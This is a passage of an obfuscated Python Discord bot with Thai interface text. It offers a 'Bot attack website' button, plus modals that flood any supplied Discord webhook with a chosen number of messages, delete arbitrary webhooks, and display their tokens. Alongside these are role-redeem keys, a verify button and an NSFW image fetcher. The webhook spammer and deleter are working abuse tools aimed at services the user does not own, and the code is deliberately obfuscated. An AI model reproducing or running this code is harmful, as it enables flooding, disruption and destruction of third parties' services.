    async def callback (O0OO0OO0OOOOOOOO0 ,OOO0OO00OO0O00OO0 ,O00OO00OOOOOO00OO :nextcord .Interaction ):#line:589:async def callback(self, button, interaction: nextcord.Interaction):
        return await O00OO00OOOOOO00OO .response .send_modal (dssddsauhf ())#line:590:return await interaction.response.send_modal(dssddsauhf())
class Button (nextcord .ui .View ):#line:592:class Button(nextcord.ui.View):
    def __init__ (O00O0OO0O0OOOO0O0 ):#line:593:def __init__(self):
        super ().__init__ (timeout =None )#line:594:super().__init__(timeout=None)
    @nextcord .ui .button (label ='ATTACK',style =nextcord .ButtonStyle .green )#line:599:)
    async def callback (OOO000OO0O0O0O0OO ,O0OO0O00OOO0OOOOO ,OO00OOOOO0OOOOO00 :nextcord .Interaction ):#line:600:async def callback(self, button, interaction: nextcord.Interaction):
        return await OO00OOOOO0OOOOO00 .response .send_modal (dssddsauhf ())#line:601:return await interaction.response.send_modal(dssddsauhf())
@bot .command (pass_context =True )#line:603:@bot.command(pass_context=True)
async def attack_setup (OOOOOO0OOOOO0OO0O :nextcord .Interaction ):#line:604:async def attack_setup(interaction: nextcord.Interaction):
    if OOOOOO0OOOOO0OO0O .author .name ==name :#line:605:if interaction.author.name == name:
        O00O0O0O0O0OO0O00 =nextcord .Embed ()#line:606:embed = nextcord.Embed()
        O00O0O0O0O0OO0O00 =nextcord .Embed (title ='Bot attack website',description ='กดปุ่มเพื่อยิงเว็บ')#line:610:)
        await OOOOOO0OOOOO0OO0O .send (embed =O00O0O0O0O0OO0O00 ,view =attack ())#line:611:await interaction.send(embed=embed, view=attack())
class MyRedeem (nextcord .ui .Modal ):#line:613:class MyRedeem(nextcord.ui.Modal):
    def __init__ (OO0OOO0O000OO0O0O ):#line:614:def __init__(self):
        super ().__init__ ('Redeem')#line:615:super().__init__('Redeem')
        OO0OOO0O000OO0O0O .key =nextcord .ui .TextInput (label ='Key',placeholder ='xxxxxxxxxxxxxxxxxxx',required =True ,custom_id ='keyredeem')#line:616:self.key = nextcord.ui.TextInput(label='Key', placeholder='xxxxxxxxxxxxxxxxxxx', required=True, custom_id='keyredeem')
        OO0OOO0O000OO0O0O .add_item (OO0OOO0O000OO0O0O .key )#line:617:self.add_item(self.key)
    async def callback (OO00O00OO0O0OOOOO ,O0OO0O0000OO000OO :nextcord .Interaction ):#line:619:async def callback(self, interaction: nextcord.Interaction):
        try :#line:620:try:
            O0OOOOO0OOOOOOO00 =json .load (open (f'key/{OO00O00OO0O0OOOOO.key.value}.json',encoding ='utf-8'))#line:621:keyJSON = json.load(open(f'key/{self.key.value}.json', encoding='utf-8'))
            OO0OO0O0O00OOO00O =O0OOOOO0OOOOOOO00 ['roles']#line:622:role = keyJSON['roles']
            OOO00OOO0OO00OOO0 =O0OOOOO0OOOOOOO00 ['status']#line:623:status = keyJSON['status']
            if OOO00OOO0OO00OOO0 =='false':#line:625:if status == 'false':
                OOO0O000O000O00O0 ='คีย์นี้ถูกใช้งานไปแล้ว!'#line:626:content = 'คีย์นี้ถูกใช้งานไปแล้ว!'
            else :#line:627:else:
                for OOOOO0O0OO0OO000O in O0OO0O0000OO000OO .user .roles :#line:628:for r in interaction.user.roles:
                    if f'{OO0OO0O0O00OOO00O}'in OOOOO0O0OO0OO000O .name :#line:629:if f'{role}' in r.name:
                        return await O0OO0O0000OO000OO .response .send_message ('ไม่สามารถใขช้งานได้ - คุณมียศนี้อยู่แล้ว',ephemeral =True )#line:630:return await interaction.response.send_message('ไม่สามารถใขช้งานได้ - คุณมียศนี้อยู่แล้ว', ephemeral=True)
                with open (f'key/{OO00O00OO0O0OOOOO.key.value}.json','w',encoding ='utf-8')as O000O00O0O0OO0000 :#line:632:with open(f'key/{self.key.value}.json', 'w', encoding='utf-8') as f:
                    O0OO00000O0O0OO0O ={'roles':OO0OO0O0O00OOO00O ,'status':'false'}#line:636:}
                    O000O00O0O0OO0000 .write (json .dumps (O0OO00000O0O0OO0O ,indent =4 ))#line:637:f.write(json.dumps(da, indent=4))
                OOO0O0O0OOO0O0OO0 =nextcord .utils .get (O0OO0O0000OO000OO .guild .roles ,name =f'{OO0OO0O0O00OOO00O}')#line:638:utils = nextcord.utils.get(interaction.guild.roles, name=f'{role}')
                try :#line:639:try:
                    await O0OO0O0000OO000OO .user .add_roles (OOO0O0O0OOO0O0OO0 )#line:640:await interaction.user.add_roles(utils)
                except AttributeError :#line:641:except AttributeError:
                    return await O0OO0O0000OO000OO .response .send_message ('ไม่พบยศนี้ (โปรดติดต่อแอดมิน)',ephemeral =True )#line:642:return await interaction.response.send_message('ไม่พบยศนี้ (โปรดติดต่อแอดมิน)', ephemeral=True)
                OOO0O000O000O00O0 =f'คุณได้รับยศสำเร็จแล้ว!'#line:643:content = f'คุณได้รับยศสำเร็จแล้ว!'
        except FileNotFoundError :#line:644:except FileNotFoundError:
            OOO0O000O000O00O0 ='ไม่พบคีย์นี้ในระบบ!'#line:645:content = 'ไม่พบคีย์นี้ในระบบ!'
        return await O0OO0O0000OO000OO .response .send_message (content =OOO0O000O000O00O0 ,ephemeral =True )#line:647:return await interaction.response.send_message(content=content, ephemeral=True)
class SetupView (nextcord .ui .View ):#line:649:class SetupView(nextcord.ui.View):
    def __init__ (OOO0O0OO000OO000O ):#line:650:def __init__(self):
        super ().__init__ (timeout =None )#line:651:super().__init__(timeout=None)
    @nextcord .ui .button (label ='Redeem',style =nextcord .ButtonStyle .green ,custom_id ='redeem',row =0 )#line:658:)
    async def redeem (O0O00000OO00000O0 ,O000OO0O0OO00OO00 :nextcord .ui .Button ,O00000000OO0OO0O0 :nextcord .Interaction ):#line:659:async def redeem(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        return await O00000000OO0OO0O0 .response .send_modal (MyRedeem ())#line:660:return await interaction.response.send_modal(MyRedeem())
@bot .command (pass_context =True )#line:662:@bot.command(pass_context=True)
async def redeem (OOO00000OO0000OOO ):#line:663:async def redeem(ctx):
    if OOO00000OO0000OOO .author .guild_permissions .administrator :#line:664:if ctx.author.guild_permissions.administrator:
        await OOO00000OO0000OOO .message .delete ()#line:665:await ctx.message.delete()
        OOOO000OO000OO0O0 =nextcord .Embed ()#line:666:embed = nextcord.Embed()
        OOOO000OO000OO0O0 .title ='Redeem Key Gave special Roles'#line:667:embed.title = 'Redeem Key Gave special Roles'
        OOOO000OO000OO0O0 .description ='> [+] Click button below to redeem and get special roles'#line:668:embed.description = '> [+] Click button below to redeem and get special roles'
        OOOO000OO000OO0O0 .set_image (url =Images )#line:669:embed.set_image(url=Images)
        await OOO00000OO0000OOO .send (embed =OOOO000OO000OO0O0 ,view =SetupView ())#line:670:await ctx.send(embed=embed, view=SetupView())
@bot .slash_command (name ='add-key',)#line:673:)
async def add (O00O0OO0O0OOOOO00 :nextcord .Interaction ,O00O00OO00OO0O0O0 ,O0OOOOO000O0OOOO0 ):#line:675:async def add(interaction: nextcord.Interaction, key, role_name):
    if O00O0OO0O0OOOOO00 .user .guild_permissions .administrator :#line:676:if interaction.user.guild_permissions.administrator:
        with open (f'key/{O00O00OO00OO0O0O0}.json','w+',encoding ='utf-8')as OOO0O00000O0OOO0O :#line:677:with open(f'key/{key}.json', 'w+', encoding='utf-8') as k:
            OO0O000OO0000O000 ={'roles':O0OOOOO000O0OOOO0 ,'status':'true','key':O00O00OO00OO0O0O0 }#line:682:}
            OOO0O00000O0OOO0O .write (json .dumps (OO0O000OO0000O000 ,indent =4 ))#line:683:k.write(json.dumps(s, indent=4))
        return await O00O0OO0O0OOOOO00 .response .send_message ('เพิ่มคีย์สำเร็จแล้ว!',ephemeral =True )#line:684:return await interaction.response.send_message('เพิ่มคีย์สำเร็จแล้ว!', ephemeral=True)
async def logsend (O000000OOOO00OO00 ):#line:687:async def logsend(embed):
    async with aiohttp .ClientSession ()as OO0OO0O00OOO0O000 :#line:688:async with aiohttp.ClientSession() as session:
        O00OOO00OOOOOOOO0 =nextcord .Webhook .from_url (WEBHOOK_URL ,session =OO0OO0O00OOO0O000 )#line:689:webhook = nextcord.Webhook.from_url(WEBHOOK_URL, session=session)
        await O00OOO00OOOOOOOO0 .send (embed =O000000OOOO00OO00 )#line:690:await webhook.send(embed=embed)
class verify (nextcord .ui .View ):#line:692:class verify(nextcord.ui.View):
    def __init__ (OO0O00O000OOO0OO0 ):#line:693:def __init__(self):
        super ().__init__ (timeout =None )#line:694:super().__init__(timeout=None)
    @nextcord .ui .button (label =BUTTON_NAME ,style =nextcord .ButtonStyle .blurple ,emoji ="<a:1_:1175394062396837928>",custom_id ="addrole")#line:696:@nextcord.ui.button(label=BUTTON_NAME, style=nextcord.ButtonStyle.blurple, emoji="<a:1_:1175394062396837928>", custom_id="addrole")
    async def addrole (OO0O00OOOO0OO0OO0 ,OO00O00OOOOO00O00 :nextcord .Button ,OOO000000O0O0O00O :nextcord .Interaction ):#line:697:async def addrole(self, button: nextcord.Button, interaction: nextcord.Interaction):
        O000OOOO0O000000O =nextcord .utils .get (OOO000000O0O0O00O .guild .roles ,id =ROLE_ID )#line:698:role = nextcord.utils.get(interaction.guild.roles, id=ROLE_ID)
        if not O000OOOO0O000000O :#line:700:if not role:
            O0000OOO0OOOO0000 =nextcord .Embed (description ="บทบาทที่ถูกตั้งค่าไม่พบในเซิร์ฟเวอร์",color =0xff6961 )#line:701:embed = nextcord.Embed(description="บทบาทที่ถูกตั้งค่าไม่พบในเซิร์ฟเวอร์", color=0xff6961)
            await OOO000000O0O0O00O .send (embed =O0000OOO0OOOO0000 ,ephemeral =True )#line:702:await interaction.send(embed=embed, ephemeral=True)
            return #line:703:return
        if O000OOOO0O000000O in OOO000000O0O0O00O .user .roles :#line:705:if role in interaction.user.roles:
            O0000OOO0OOOO0000 =nextcord .Embed (description ="คุณอยู่มียศอยู่แล้ว",color =0xff6961 )#line:706:embed = nextcord.Embed(description="คุณอยู่มียศอยู่แล้ว", color=0xff6961)
            await OOO000000O0O0O00O .send (embed =O0000OOO0OOOO0000 ,ephemeral =True )#line:707:await interaction.send(embed=embed, ephemeral=True)
            return #line:708:return
        else :#line:709:else:
            await OOO000000O0O0O00O .user .add_roles (O000OOOO0O000000O )#line:710:await interaction.user.add_roles(role)
            O0000OOO0OOOO0000 =nextcord .Embed (description ="คุณยืนยันตัวตนสำเร็จ",color =0x77dd77 )#line:712:embed = nextcord.Embed(description="คุณยืนยันตัวตนสำเร็จ", color=0x77dd77)
            await OOO000000O0O0O00O .send (embed =O0000OOO0OOOO0000 ,ephemeral =True )#line:713:await interaction.send(embed=embed, ephemeral=True)
            OOO0OOOO0000O0OOO =nextcord .Embed (description =f"คุณได้รับยศ `{O000OOOO0O000000O}` ในเซิร์ฟเวอร์ `{OOO000000O0O0O00O.guild.name}` เรียบร้อยแล้ว",color =0xffffff )#line:715:dm = nextcord.Embed(description=f"คุณได้รับยศ `{role}` ในเซิร์ฟเวอร์ `{interaction.guild.name}` เรียบร้อยแล้ว", color=0xffffff)
            await OOO000000O0O0O00O .user .send (embed =OOO0OOOO0000O0OOO )#line:716:await interaction.user.send(embed=dm)
            O00000OO0OOO0OO0O =nextcord .Embed (title ="รับยศสำเร็จ",description =f"รับยศ `{O000OOOO0O000000O}` สำเร็จ",color =0x00ff00 )#line:718:log = nextcord.Embed(title="รับยศสำเร็จ", description=f"รับยศ `{role}` สำเร็จ", color=0x00ff00)
            O00000OO0OOO0OO0O .set_author (name =OOO000000O0O0O00O .user ,icon_url =OOO000000O0O0O00O .user .avatar )#line:719:log.set_author(name=interaction.user, icon_url=interaction.user.avatar)
            O00000OO0OOO0OO0O .set_footer (text =f'ไอดียศ: {ROLE_ID} วันที่และเวลา {current_time}')#line:720:log.set_footer(text=f'ไอดียศ: {ROLE_ID} วันที่และเวลา {current_time}')
            await logsend (O00000OO0OOO0OO0O )#line:722:await logsend(log)
async def logsend (OO00OO0O00O0OOOO0 ):#line:724:async def logsend(embed):
  async with aiohttp .ClientSession ()as O0O00OOO0OOO0O0OO :#line:725:async with aiohttp.ClientSession() as session:
    O00OO00O000000OO0 =nextcord .Webhook .from_url (WEBHOOK_URL ,session =O0O00OOO0OOO0O0OO )#line:726:webhook = nextcord.Webhook.from_url(WEBHOOK_URL, session=session)
    await O00OO00O000000OO0 .send (embed =OO00OO0O00O0OOOO0 )#line:727:await webhook.send(embed=embed)
class Spam (nextcord .ui .Modal ):#line:729:class Spam(nextcord.ui.Modal):
    def __init__ (O0OO0OOOOOOOO0O0O ):#line:730:def __init__(self):
        super ().__init__ ("สแปมเว็ปฮุค")#line:731:super().__init__("สแปมเว็ปฮุค")
        O0OO0OOOOOOOO0O0O .webhook =nextcord .ui .TextInput (label ="ลิ้งค์เว็บฮุค",required =True )#line:735:)
        O0OO0OOOOOOOO0O0O .add_item (O0OO0OOOOOOOO0O0O .webhook )#line:736:self.add_item(self.webhook)
        O0OO0OOOOOOOO0O0O .msg =nextcord .ui .TextInput (label ="ข้อความ",required =True )#line:740:)
        O0OO0OOOOOOOO0O0O .add_item (O0OO0OOOOOOOO0O0O .msg )#line:741:self.add_item(self.msg)
        O0OO0OOOOOOOO0O0O .amount =nextcord .ui .TextInput (label ="จำนวน",required =True )#line:745:)
        O0OO0OOOOOOOO0O0O .add_item (O0OO0OOOOOOOO0O0O .amount )#line:746:self.add_item(self.amount)
    async def callback (OO00OO0OO0OOOOOO0 ,O000000OOO0O000O0 :nextcord .Interaction ):#line:747:async def callback(self, interaction: nextcord.Interaction):
        OO0OOO0O0O000OOOO =requests .get (OO00OO0OO0OOOOOO0 .webhook .value )#line:748:response = requests.get(self.webhook.value)
        if not match (r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}",OO00OO0OO0OOOOOO0 .webhook .value ):#line:749:if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
          return await O000000OOO0O000O0 .send ("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral =True )#line:750:return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
        if OO0OOO0O0O000OOOO .status_code ==200 :#line:751:if response.status_code == 200:
          await O000000OOO0O000O0 .send (f"**สแปมเว็ปฮุคสําเร็จ** `{OO00OO0OO0OOOOOO0.webhook.value}`",ephemeral =True )#line:752:await interaction.send(f"**สแปมเว็ปฮุคสําเร็จ** `{self.webhook.value}`",ephemeral=True)
          for O0OOO0OOOO00O0000 in range (int (OO00OO0OO0OOOOOO0 .amount .value )):#line:753:for i in range(int(self.amount.value)):
            requests .post (OO00OO0OO0OOOOOO0 .webhook .value ,json ={'content':OO00OO0OO0OOOOOO0 .msg .value })#line:754:requests.post(self.webhook.value,json={ 'content' : self.msg.value})
        else :#line:755:else:
          await O000000OOO0O000O0 .send ("**สแปมว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral =True )#line:756:await interaction.send("**สแปมว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)
class Delete (nextcord .ui .Modal ):#line:758:class Delete(nextcord.ui.Modal):
    def __init__ (O00OO000O000OO00O ):#line:759:def __init__(self):
        super ().__init__ ("ลบเว็ปฮุค")#line:760:super().__init__("ลบเว็ปฮุค")
        O00OO000O000OO00O .webhook =nextcord .ui .TextInput (label ="ลิ้งค์เว็บฮุค",required =True )#line:764:)
        O00OO000O000OO00O .add_item (O00OO000O000OO00O .webhook )#line:765:self.add_item(self.webhook)
    async def callback (OOOO0O00OO0OO0O00 ,O0OO00OOO0O0O0000 :nextcord .Interaction ):#line:766:async def callback(self, interaction: nextcord.Interaction):
        if not match (r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}",OOOO0O00OO0OO0O00 .webhook .value ):#line:767:if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
          return await O0OO00OOO0O0O0000 .send ("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral =True )#line:768:return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
        if requests .delete (OOOO0O00OO0OO0O00 .webhook .value ).status_code ==204 :#line:769:if requests.delete(self.webhook.value).status_code == 204:
          await O0OO00OOO0O0O0000 .send (f"**ลบเว็ปฮุคสําเร็จ** `{OOOO0O00OO0OO0O00.webhook.value}`",ephemeral =True )#line:770:await interaction.send(f"**ลบเว็ปฮุคสําเร็จ** `{self.webhook.value}`",ephemeral=True)
        else :#line:771:else:
          await O0OO00OOO0O0O0000 .send ("**ลบเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral =True )#line:772:await interaction.send("**ลบเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)
class Check (nextcord .ui .Modal ):#line:774:class Check(nextcord.ui.Modal):
    def __init__ (OO000OO0OO000O000 ):#line:775:def __init__(self):
        super ().__init__ ("เช็คเว็ปฮุค")#line:776:super().__init__("เช็คเว็ปฮุค")
        OO000OO0OO000O000 .webhook =nextcord .ui .TextInput (label ="ลิ้งค์เว็บฮุค",required =True )#line:780:)
        OO000OO0OO000O000 .add_item (OO000OO0OO000O000 .webhook )#line:781:self.add_item(self.webhook)
    async def callback (O0OOO0O0000000OO0 ,OOOOOO00O00O000OO :nextcord .Interaction ):#line:782:async def callback(self, interaction: nextcord.Interaction):
        O0OOOOOOOOOOOOOO0 =requests .get (O0OOO0O0000000OO0 .webhook .value )#line:783:response = requests.get(self.webhook.value)
        if not match (r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}",O0OOO0O0000000OO0 .webhook .value ):#line:784:if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
          return await OOOOOO00O00O000OO .send ("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral =True )#line:785:return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
        if O0OOOOOOOOOOOOOO0 .status_code ==200 :#line:786:if response.status_code == 200:
          OOOOO0OO000O0O00O =O0OOOOOOOOOOOOOO0 .json ()#line:787:i = response.json()
          if OOOOO0OO000O0O00O ['avatar']==None :#line:788:if i['avatar'] == None:
            O000OOOOOOO00O0O0 =nextcord .Embed (description =f"**ชนิด** : `{OOOOO0OO000O0O00O['type']}`\n**ไอดี** : `{OOOOO0OO000O0O00O['id']}`\n**ชื่อ** : `{OOOOO0OO000O0O00O['name']}`\n**ไอดีช่อง** : `{OOOOO0OO000O0O00O['channel_id']}`\n**ไอดีเซิฟ** : `{OOOOO0OO000O0O00O['guild_id']}`\n**ไอดีแอปพลิเคชัน** : `{OOOOO0OO000O0O00O['application_id']}`\n**โทเคนเว็ปฮุค** : `{OOOOO0OO000O0O00O['token']}`")#line:789:embed = nextcord.Embed(description=f"**ชนิด** : `{i['type']}`\n**ไอดี** : `{i['id']}`\n**ชื่อ** : `{i['name']}`\n**ไอดีช่อง** : `{i['channel_id']}`\n**ไอดีเซิฟ** : `{i['guild_id']}`\n**ไอดีแอปพลิเคชัน** : `{i['application_id']}`\n**โทเคนเว็ปฮุค** : `{i['token']}`")
            await OOOOOO00O00O000OO .send (embed =O000OOOOOOO00O0O0 ,ephemeral =True )#line:790:await interaction.send(embed=embed,ephemeral=True)
          else :#line:791:else:
            O000OOOOOOO00O0O0 =nextcord .Embed (description =f"**ชนิด** : `{OOOOO0OO000O0O00O['type']}`\n**ไอดี** : `{OOOOO0OO000O0O00O['id']}`\n**ชื่อ** : `{OOOOO0OO000O0O00O['name']}`\n**ไอดีช่อง** : `{OOOOO0OO000O0O00O['channel_id']}`\n**ไอดีเซิฟ** : `{OOOOO0OO000O0O00O['guild_id']}`\n**ไอดีแอปพลิเคชัน** : `{OOOOO0OO000O0O00O['application_id']}`\n**โทเคนเว็ปฮุค** : `{OOOOO0OO000O0O00O['token']}`")#line:792:embed = nextcord.Embed(description=f"**ชนิด** : `{i['type']}`\n**ไอดี** : `{i['id']}`\n**ชื่อ** : `{i['name']}`\n**ไอดีช่อง** : `{i['channel_id']}`\n**ไอดีเซิฟ** : `{i['guild_id']}`\n**ไอดีแอปพลิเคชัน** : `{i['application_id']}`\n**โทเคนเว็ปฮุค** : `{i['token']}`")
            O000OOOOOOO00O0O0 .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{OOOOO0OO000O0O00O['id']}/{OOOOO0OO000O0O00O['avatar']}.png")#line:793:embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{i['id']}/{i['avatar']}.png")
            await OOOOOO00O00O000OO .send (embed =O000OOOOOOO00O0O0 ,ephemeral =True )#line:794:await interaction.send(embed=embed,ephemeral=True)
        else :#line:795:else:
          await OOOOOO00O00O000OO .send ("**เช็คเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral =True )#line:796:await interaction.send("**เช็คเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)
class webhook (nextcord .ui .View ):#line:798:class webhook(nextcord.ui.View):
    def __init__ (O0OO00OO000O0OO0O ):#line:799:def __init__(self):
        super ().__init__ (timeout =None )#line:800:super().__init__(timeout=None)
    @nextcord .ui .button (label ="เช็คเว็ปฮุค",style =nextcord .ButtonStyle .green ,emoji ="<a:Black_CatLinguinha:1198632831488897107>",custom_id ="check")#line:802:@nextcord.ui.button(label="เช็คเว็ปฮุค", style=nextcord.ButtonStyle.green, emoji="<a:Black_CatLinguinha:1198632831488897107>",custom_id="check")
    async def check (O0O000O00OOOO00O0 ,O0OO000O0OO0OO000 :nextcord .Button ,OO0O0O000OOO000O0 :nextcord .Interaction ):#line:803:async def check(self, button: nextcord.Button , interaction: nextcord.Interaction):
                await OO0O0O000OOO000O0 .response .send_modal (Check ())#line:804:await interaction.response.send_modal(Check())
    @nextcord .ui .button (label ="สแปมเว็บฮุค",style =nextcord .ButtonStyle .blurple ,emoji ="<a:BlackCat:1198631834087592011>",custom_id ="spam")#line:806:@nextcord.ui.button(label="สแปมเว็บฮุค", style=nextcord.ButtonStyle.blurple, emoji="<a:BlackCat:1198631834087592011>",custom_id="spam")
    async def spam (OO0OOOO0O0OO0O00O ,OOO0O00OOOO0OOO0O :nextcord .Button ,O00OO00OOO0O000O0 :nextcord .Interaction ):#line:807:async def spam(self, button: nextcord.Button , interaction: nextcord.Interaction):
                await O00OO00OOO0O000O0 .response .send_modal (Spam ())#line:808:await interaction.response.send_modal(Spam())
    @nextcord .ui .button (label ="ลบเว็บฮุค",style =nextcord .ButtonStyle .red ,emoji ="<:dawdas:1202987022994776145>",custom_id ="delete")#line:810:@nextcord.ui.button(label="ลบเว็บฮุค", style=nextcord.ButtonStyle.red, emoji="<:dawdas:1202987022994776145>",custom_id="delete")
    async def delete (OO000O0OO00O000OO ,OO0O0O000O0000O0O :nextcord .Button ,O00O0OOOO000O0OOO :nextcord .Interaction ):#line:811:async def delete(self, button: nextcord.Button , interaction: nextcord.Interaction):
                await O00O0OOOO000O0OOO .response .send_modal (Delete ())#line:812:await interaction.response.send_modal(Delete())
@bot .command (pass_context =True )#line:815:@bot.command(pass_context = True)
async def webhook_setup (O00OOOOOOO000O0O0 ):#line:816:async def webhook_setup(ctx):
    if O00OOOOOOO000O0O0 .author .guild_permissions .administrator :#line:817:if ctx.author.guild_permissions.administrator:
            await O00OOOOOOO000O0O0 .message .delete ()#line:818:await ctx.message.delete()
            OO000OO00O0O0OOO0 =nextcord .Embed (title ="สแปมเว็ปฮุค กับ ลบเว็ปฮุค ผ่านบอทแบบปุ่มกด",color =0x7289da )#line:819:embed = nextcord.Embed(title="สแปมเว็ปฮุค กับ ลบเว็ปฮุค ผ่านบอทแบบปุ่มกด",color=0x7289da)
            OO000OO00O0O0OOO0 .set_image (url =Images )#line:820:embed.set_image(url=Images)
            await O00OOOOOOO000O0O0 .send (embed =OO000OO00O0O0OOO0 ,view =webhook ())#line:821:await ctx.send(embed=embed, view=webhook())
    else :#line:822:else:
        await O00OOOOOOO000O0O0 .reply ('มึงไม่มีสิทธิ์ใช้ครับไอ้โง่')#line:823:await ctx.reply('มึงไม่มีสิทธิ์ใช้ครับไอ้โง่')
@bot .command ()#line:825:@bot.command()
async def verify_setup (O000O0OO0OOOOOOO0 ):#line:826:async def verify_setup(ctx):
    if O000O0OO0OOOOOOO0 .author .guild_permissions .administrator :#line:827:if ctx.author.guild_permissions.administrator:
        await O000O0OO0OOOOOOO0 .message .delete ()#line:828:await ctx.message.delete()
        OOO0O0O0O0O0OO00O =nextcord .Embed (title ="กดปุ่มรับยศ",description ="```อย่าลืมกดรับยศก่อนจะเข้าดิสมาด้วยนะครับ\nหากบอทมีปัญหาทัก DMs หาผมเลยผมจะรีบแก้ไข ⚙️```",color =0xfbe7ff )#line:829:embed = nextcord.Embed(title="กดปุ่มรับยศ", description="```อย่าลืมกดรับยศก่อนจะเข้าดิสมาด้วยนะครับ\nหากบอทมีปัญหาทัก DMs หาผมเลยผมจะรีบแก้ไข ⚙️```", color=0xfbe7ff)
        OOO0O0O0O0O0OO00O .set_image (url =Images )#line:830:embed.set_image(url=Images)
        await O000O0OO0OOOOOOO0 .send (embed =OOO0O0O0O0O0OO00O ,view =verify ())#line:831:await ctx.send(embed=embed, view=verify())
    else :#line:832:else:
        await O000O0OO0OOOOOOO0 .reply ('คุณไม่มีสิทธิ์ใช้คำสั่งนี้')#line:833:await ctx.reply('คุณไม่มีสิทธิ์ใช้คำสั่งนี้')
@bot .command ()#line:835:@bot.command()
async def check_time (OOOO00OO00OO0OO0O ):#line:836:async def check_time(ctx):
    await OOOO00OO00OO0OO0O .send (f"เวลาปัจจุบันคือ: ⌚{current_time}")#line:837:await ctx.send(f"เวลาปัจจุบันคือ: ⌚{current_time}")
@bot .command ()#line:839:@bot.command()
async def uptime (OO0OOO0OO00O0O0O0 ):#line:840:async def uptime(ctx):
    O00OO000000O000OO =datetime .now ()-start_time #line:842:uptime_message = datetime.now() - start_time
    O0O0O0O0O00OO0OOO ,OO00O00OOOOOO0OO0 =divmod (int (O00OO000000O000OO .total_seconds ()),3600 )#line:845:hours, remainder = divmod(int(uptime_message.total_seconds()), 3600)
    O0OOOOO00O00OOO0O ,OOO0OO0OO0O0O00O0 =divmod (OO00O00OOOOOO0OO0 ,60 )#line:846:minutes, seconds = divmod(remainder, 60)
    O00O0OO0O0O0OO00O ,O0O0O0O0O00OO0OOO =divmod (O0O0O0O0O00OO0OOO ,24 )#line:847:days, hours = divmod(hours, 24)
    O0OO0O0O0000OOO0O =f"{O00O0OO0O0O0OO00O} วัน, {O0O0O0O0O00OO0OOO} ชั่วโมง, {O0OOOOO00O00OOO0O} นาที, {OOO0OO0OO0O0O00O0} วินาที"#line:850:uptime_start = f"{days} วัน, {hours} ชั่วโมง, {minutes} นาที, {seconds} วินาที"
    await OO0OOO0OO00O0O0O0 .reply (f"บอทออนไลน์มาแล้วเป็นเวลา: {O0OO0O0O0000OOO0O}")#line:853:await ctx.reply(f"บอทออนไลน์มาแล้วเป็นเวลา: {uptime_start}")
class NSFW (nextcord .ui .View ):#line:855:class NSFW(nextcord.ui.View):
    def __init__ (O0O0O00O00000OO00 ):#line:856:def __init__(self):
        super ().__init__ (timeout =None )#line:857:super().__init__(timeout=None)
    @nextcord .ui .button (emoji ='<a:DancingBlackCat:1198633069742141623>',label ='แสดงรูปภาพ',style =nextcord .ButtonStyle .blurple )#line:863:)
    async def send (OOO00OOOO00O00O0O ,O0OO0000OO0O00O00 :nextcord .Button ,O0OOO000O0O00OO00 :nextcord .Interaction ):#line:864:async def send(self, button: nextcord.Button, interaction: nextcord.Interaction):
        OO000OO0O0O0O0O0O =await O0OOO000O0O00OO00 .response .send_message ('## > [+] โปรดรอสักครู่...',ephemeral =True )#line:865:msg = await interaction.response.send_message('## > [+] โปรดรอสักครู่...', ephemeral=True)
        O0OOOOOO0O0O00OOO ='https://api.waifu.pics/nsfw/waifu'#line:866:api = 'https://api.waifu.pics/nsfw/waifu'
        OO0000OO0OOOO0OO0 =requests .get (O0OOOOOO0O0O00OOO ).json ()['url']#line:868:url = requests.get(api).json()['url']
        await OO000OO0O0O0O0O0O .edit (content =f'{OO0000OO0OOOO0OO0}')#line:870:await msg.edit(content=f'{url}')
@bot .command (pass_context =True )#line:872:@bot.command(pass_context = True)
async def nsfw_setup (OO00O0O00O0O00000 :nextcord .Interaction ):#line:873:async def nsfw_setup(interaction: nextcord.Interaction):
    await OO00O0O00O0O00000 .message .delete ()#line:874:await interaction.message.delete()
    if OO00O0O00O0O00000 .author .name ==name :#line:875:if interaction.author.name == name:
        OOOOO0OOOO0O00000 =nextcord .Embed (description ='คลิกปุ่มเพื่อสุ่มรูปอนิเมะ 18+',color =None )#line:879:)
        OOOOO0OOOO0O00000 .set_image (url =Images )#line:880:embed.set_image(url=Images)
        await OO00O0O00O0O00000 .send (embed =OOOOO0OOOO0O00000 ,view =NSFW ())#line:881:await interaction.send(embed=embed, view=NSFW())
class script (nextcord .ui .View ):#line:883:class script(nextcord.ui.View):
    def __init__ (O0OO0OO0O0O00OOO0 ):#line:884:def __init__(self):
        super ().__init__ (timeout =None )#line:885:super().__init__(timeout=None)
    @nextcord .ui .button (emoji ='<:dawdas:1202987022994776145>',label ='Get Script',style =nextcord .ButtonStyle .blurple )#line:891:)
